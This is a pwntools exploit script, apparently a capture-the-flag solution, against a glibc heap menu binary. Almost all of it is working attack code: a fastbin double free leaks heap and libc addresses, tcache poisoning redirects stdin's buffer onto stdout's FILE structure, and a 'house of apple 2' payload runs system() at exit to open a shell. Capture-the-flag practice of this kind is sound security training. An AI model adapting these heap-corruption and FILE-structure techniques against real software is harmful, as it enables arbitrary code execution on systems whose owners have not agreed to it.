#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './main_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc host port'.split()

libc_path = './libc.so.6'
ld_path = './ld-linux-x86-64.so.2'
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            log.error(f'"{name}" doesn\'t exist')
            return lambda: ...
        
        if hasattr(resolved, 'address'):
            resolved = getattr(resolved, 'address')
            
            if not resolved & 0xfff:
                log.success(term.text.bold_green(f'{name}.address & 0xFFF == 0'))
            else:
                log.warn(term.text.bold_yellow(f'{name}.address & 0xFFF != 0'))
        
        log.info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda: ...

logx = LogAddressHex()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    kw['env'] = {"SHELL": "/bin/sh"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def ua(x):
    return int.from_bytes(x, 'little')
idx = 0

def create(id, age, name=p64(0)):
    global idx
    p.sendlineafter(b'>>',b'1')
    p.sendline(str(id).encode())
    p.sendline(str(age).encode())
    p.sendline(name)
    idx += 1
    return idx - 1
    
def delete(idx):
    p.sendlineafter(b'>>',b'2')
    p.sendline(str(idx).encode())
    
def view():
    p.sendlineafter(b'>>',b'3')
    
def edit(idx, id, age, name=p64(0)):
    p.sendlineafter(b'>>',b'4')
    p.sendline(str(idx).encode())
    p.sendline(str(id).encode())
    p.sendline(str(age).encode())
    p.sendline(name)

def ex(amt):
    p.sendlineafter(b'>>', b'3')
    result = []
    for _ in range(amt):
        line = p.recvline()
        parts = line.split(b', ')
        idx = int(parts[0].split(b': ')[1])
        id_val = int(parts[1].split(b': ')[1])
        age = int(parts[2].split(b': ')[1])
        name = ua(parts[3].split(b': ')[1][:-1])
        result.append([idx, id_val, age, name])
    return result

gdbscript = '''
b *(main+0)
continue
'''.format(**locals())

p = start()

# allocate for prepare fastbin
for i in range(7):
    create(0, 0)
fb1 = create(0, 0)
fb2 =  create(0, 0)

# this is roughly size of unsorted bin
# we have 0x20 as fake size for later fastbin dup
for i in range(35):
    create(0, 0x20)

# free to exhaust tcache
for i in range(7):
    delete(i)
    
# fastbin dup
delete(fb1)
delete(fb2)
delete(fb1)

# extract heap leak
leak = ex(42)
leak_mangle = leak[0][1]
logx.leak_mangle

# get back tcache
for i in range(7):
    create(0, 0, name=p64(i))
    
target = leak_mangle * 0x1000 + 0x3d0
logx.target

# corrupt fastbin to point to size header of fake chunk
create(target ^ leak_mangle, 0)
create(0, 0)
create(0, 0)

# ovw size to 0x421
ub = create(0, 0x421)

# free unsorted bin and get libc leak
delete(10)
leak2 = ex(42)
leak_libc = leak2[10][1]
logx.leak_libc
libc.address = leak_libc - (libc.sym.main_arena + 96)
logx.libc


# last thing on the tcache free list messed up,
# so we free 3 times
delete(0)
delete(1)
delete(2)

# now we extract tcache key because we need that -
# for tcache poisoning to _IO_2_1_stdin_ file struct
leak3 = ex(42)
key = leak3[1][2]
logx.key
pprint(leak3)

# _IO_2_1_stdin_->_IO_buf_base - 0x8 
# https://ctftime.org/writeup/38299
# substract 8 is because it needs to be aligned 16 bytes
next_target = libc.sym._IO_2_1_stdin_+48
IO_target = libc.sym._IO_2_1_stdout_

logx.next_target
edit(2, next_target ^ leak_mangle, key)
create(0, 0)
# 0 is junk, IO_target is the stdout file struct -
# and then we do +0x1000 to read in 0x1000 bytes
create(0, IO_target, name=p64(IO_target+0x1000))

# free 2 more to prevent crash -
# because first chunk tcache free list is corrupted
delete(3)
delete(4)

# house of apple
from pwncli import IO_FILE_plus_struct
house_of_apple = IO_FILE_plus_struct().house_of_apple2_execmd_when_exit(
    standard_FILE_addr=IO_target,
    _IO_wfile_jumps_addr=libc.sym['_IO_wfile_jumps'],
    system_addr=libc.sym.system,
)

payload = b'a' * 8 + house_of_apple
# we are not putting the payload in heap -
# but it goes to the stdin buffer -
# which we overwrite to be at _IO_2_1_stdout_
create(0, 0, name=payload)
p.sendline(b'1')
p.interactive()